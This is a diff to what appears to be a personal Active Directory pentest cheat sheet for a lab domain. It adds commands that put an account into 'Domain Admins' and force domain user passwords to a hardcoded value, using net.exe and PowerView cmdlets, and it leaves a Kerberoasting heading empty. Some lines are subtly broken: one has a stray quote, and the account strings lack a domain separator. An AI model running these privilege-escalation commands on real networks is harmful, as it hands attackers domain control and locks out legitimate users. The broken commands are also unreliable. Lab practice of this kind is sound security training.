@@ -9,7 +9,7 @@ has_children: true
 
 # {{ page.title}}
 
-## PRE-REQUISITE: Installing PowerView, PowerUp and PowerSploit
+## PRE-REQUISITE: Installing PowerUp and PowerSploit
 
 ```powershell
 # ActiveDirectory Module
@@ -36,5 +36,33 @@ mstsc.exe
 
 ## ADD MEMBER
 ```
-net group "Domain admins" dfm.a /add /domain  
+# OPTION 1
+net group "Domain admins" dfm.a /add /domain
+
+# OPTION 2
+$SecPassword = ConvertTo-SecureString 'Password123!' -AsPlainText -Force
+$Cred = New-Object System.Management.Automation.PSCredential('TESTLABdfm.a',$SecPassword)
+Add-DomainGroupMember -Identity 'Domain Admins' -Members 'jomivz' -Credential $Cred
+
+# VERIFICATION
+Get-DomainGroupMember -Identity 'Domain Admins'
 ```
+
+
+## FORCE PASSWORD CHANGE
+```
+# OPTION 1
+net user dfm.a Password123! /domain
+
+# OPTION 2
+$SecPassword = ConvertTo-SecureString 'Password123!' -AsPlainText -Force
+$Cred = New-Object System.Management.Automation.PSCredential('TESTLABdfm.a',$SecPassword)
+$UserPassword = ConvertTo-SecureString 'Password123!' -AsPlainText -Force
+Set-DomainUserPassword -Identity jomivz -AccountPassword $UserPassword ' -Credential $Cred
+```
+
+## KERBEROASTING
+```
+
+```
+
